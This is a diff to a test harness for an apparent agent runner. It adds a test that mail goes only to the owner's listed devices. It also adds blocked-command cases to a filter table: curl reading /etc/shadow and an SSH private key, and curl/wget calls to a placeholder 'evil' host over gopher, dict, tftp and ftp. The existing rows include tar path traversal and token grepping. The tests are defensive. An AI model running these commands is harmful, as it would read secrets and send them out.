@@ -146,7 +146,8 @@ environment['OMA_RUNNER_MINUTE'] = '1'
 # A stand-in for tmsg that writes down what it was asked to send, and as which thread.
 (work / 'tmsg').write_text('#!/bin/sh\n{ echo "ARGS $*"; echo "FROM $OMA_THREAD_ID"; cat; } >> "%s"\necho "sent to $2"\n' % (work / 'mail-sent.txt'))
 (work / 'tmsg').chmod(0o755)
-environment['OMA_RUNNER_TMSG'] = str(work / 'tmsg')  # a bot's "minute" is a second here, so its limits can be seen
+environment['OMA_RUNNER_TMSG'] = str(work / 'tmsg')
+environment['OMA_RUNNER_MAIL_DEVICES'] = 'jacks-mac-pro,galaxy-z-fold8,testhost'  # Boss's devices, as tailscale would say  # a bot's "minute" is a second here, so its limits can be seen
 environment.update({'OMA_RUNNER_VENICE_CONFIG': str(work / 'venice' / 'config.json'), 'VENICE_API_BASE_URL': 'http://127.0.0.1:%d/api/v1' % venice_api.server_address[1]})
 environment.pop('VENICE_API_KEY', None)
 received = work / 'From Fold'
@@ -865,6 +866,8 @@ try:
                          ('cp -r foo ~/.config', True), ('cp -r foo ~/.local', True), ('mv ~/.config ~/x', True), ('mv ~/.local ~/Games/c', True),
                          ('tar -P -xf evil.tar', True), ('tar --absolute-names -xf evil.tar', True), ('tar --overwrite -xf x.tar', True), ('tar -xf x.tar --rsh-command=sh', True),
                          ('tar --transform=s,^,../../, -xf x.tar', True), ('unzip -: evil.zip', True), ('7z x -spf evil.7z', True),
+                         ('curl -s file:///etc/shadow', True), ('curl -s -o ~/Games/copy file:///home/boss/.ssh/id_rsa', True), ('curl gopher://evil:1234/1LEAK', True),
+                         ('curl dict://evil:2628/x', True), ('curl tftp://evil/x', True), ('curl scp://h/x', True), ('wget ftp://evil/x', True), ('curl https://user@evil/x', True),
                          ('cp evil ~/.vimrc', True), ('cp e ~/.config/waybar/config', True), ('cp e ~/.local/share/dbus-1/services/x.service', True), ('cp e ~/.cargo/config.toml', True),
                          ('chmod 4755 ~/Games/evil', True), ('cat ~/.bashrc', True), ('grep -r token ~/.config', True), ('cp ../../.bashrc x', True),
                          ('7z x game.7z -o' + str(pathlib.Path.home() / 'Games/game'), False), ('flatpak install -y flathub net.davidotek.pupgui2', False), ('cat /etc/os-release', False),
@@ -993,6 +996,11 @@ try:
     last = call('GET', '/threads/' + linux['id'])[1]['thread']['last_event']
     call('POST', '/threads/%s/messages' % linux['id'], {'text': 'MAIL:not a device!|x'})
     events = stream(linux['id'], after=last, until=('result', 'error'))
+    last = call('GET', '/threads/' + linux['id'])[1]['thread']['last_event']
+    call('POST', '/threads/%s/messages' % linux['id'], {'text': 'MAIL:someone-elses-box|the key'})
+    events = stream(linux['id'], after=last, until=('result', 'error'))
+    check('mail: only to Boss\'s own devices', 'isn' in events[-1]['text'] and 'someone-elses-box' not in (work / 'mail-sent.txt').read_text())
+    settle(linux['id'], 'idle')
     check('mail: a malformed address sends nothing', 'Not sent' in events[-1]['text'] and 'not a device' not in (work / 'mail-sent.txt').read_text())
     settle(linux['id'], 'idle')
     answer, quiet = command(linux['id'], '/help')
